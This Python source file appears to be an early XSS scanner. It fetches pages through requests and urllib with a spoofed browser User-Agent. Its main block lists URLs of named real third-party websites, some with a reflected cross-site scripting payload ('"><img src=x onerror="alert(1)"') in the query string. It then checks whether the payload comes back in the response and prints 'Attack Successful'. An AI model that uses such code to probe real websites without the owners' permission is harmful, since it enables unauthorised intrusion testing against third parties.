from urllib.request import urlopen
import urllib.response
import urllib.request
import urllib.parse
import requests 
import urllib3 
from bs4 import BeautifulSoup

class web_request:  
    url = ''
    form_method = ''

    def __init__(self,url,method):
        self.url = url 
        self.form_method = method.lower()
    
    def open_request(self):
        s = requests.Session()
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36  (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
        'Content-Type': 'text/html',}
        try:
            if self.form_method == 'post': r = requests.post(self.url)
            else:   r = requests.get(self.url, headers=headers)
            pagesource = r.text
            # print('{WebRequest} =>  \n', pagesource)
            # self.write_response_textfile(str(pagesource))
            return pagesource
        except:
            print('\n *[Requests Failed...]* ')
            return ''

    def openurl(self):  
        headers = {}
        headers['User-Agent'] = "Mozilla/5.0 (X11; Linux i686)"
        # print('urllib => \n' , self.url)
        try:
            req  = urllib.request.Request(self.url)
            resp = urllib.request.urlopen(req, timeout=10)
            pagesource = resp.read().decode(encoding='utf-8', errors='strict') 
            # print(pagesource)
            return pagesource
        except:
            print('\n * [ ERROR Loading website with urllib ] *') 
            return ''

if __name__ == "__main__":
    
    # link = 'https://www.raremaps.com/'
    # link = 'https://www.zentechnologies.com/search/search.php?query="><img src=x onerror="alert(1)"&search=1'
    # link = 'https://ifu-institut.at/search?text="><img src=x onerror="alert(1)"&cms_token=30f71d2dffb99d557a11bb04966d80a0'
    link = 'https://www.sweetwater.com/'

    web = web_request(link, 'get')
    r = web.open_request()
    
    u = web.openurl()
    # soup = BeautifulSoup(u, features='lxml')
    # print(soup.find_all('form'))
    # r = requests.post('https://ifu-institut.at/search?text="><img src=x onerror="alert(1)"&cms_token=30f71d2dffb99d557a11bb04966d80a0')
    print(r)
    
    # source = r.text
    if( str(r).__contains__('"><img src=x onerror="alert(1)"')):
        print('\n\n \t Attack Successful')
    
    print('{WebRequest}')
